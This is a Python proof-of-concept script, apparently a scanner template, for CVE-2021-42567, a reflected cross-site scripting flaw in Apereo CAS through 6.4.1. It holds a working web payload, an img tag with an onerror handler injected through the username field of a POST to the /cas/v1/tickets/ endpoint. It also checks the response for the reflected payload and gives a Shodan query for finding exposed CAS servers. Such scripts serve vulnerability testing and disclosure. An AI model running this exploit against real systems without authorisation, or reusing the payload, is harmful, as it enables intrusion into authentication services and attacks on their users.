import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Apereo CAS Reflected Cross-Site Scripting''',
        "description": '''Apereo CAS through 6.4.1 allows cross-site scripting via POST requests sent to the REST API endpoints.''',
        "severity": "medium",
        "references": [
            "https://apereo.github.io/2021/10/18/restvuln/", 
            "https://www.sudokaikan.com/2021/12/exploit-cve-2021-42567-post-based-xss.html", 
            "https://github.com/sudohyak/exploit/blob/dcf04f704895fe7e042a0cfe9c5ead07797333cc/CVE-2021-42567/README.md", 
            "https://nvd.nist.gov/vuln/detail/CVE-2021-42567", 
            "https://github.com/apereo/cas/releases"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
            "cvss-score": "",
            "cve-id": "CVE-2021-42567",
            "cwe-id": "CWE-79"
        },
        "metadata":{
            "vuln-target": "",
            "shodan-query":"""http.title:'CAS - Central Authentication Service'"""
        },
        "tags": ["cve", "cve2021", "apereo", "xss", "cas"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/cas/v1/tickets/"""
        method = "POST"
        data = """username=%3Cimg%2Fsrc%2Fonerror%3Dalert%28document.domain%29%3E&password=test"""
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if ("""<img/src/onerror=alert(document.domain)>""" in resp0.text and """java.util.HashMap""" in resp0.text) and (resp0.status_code == 401):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url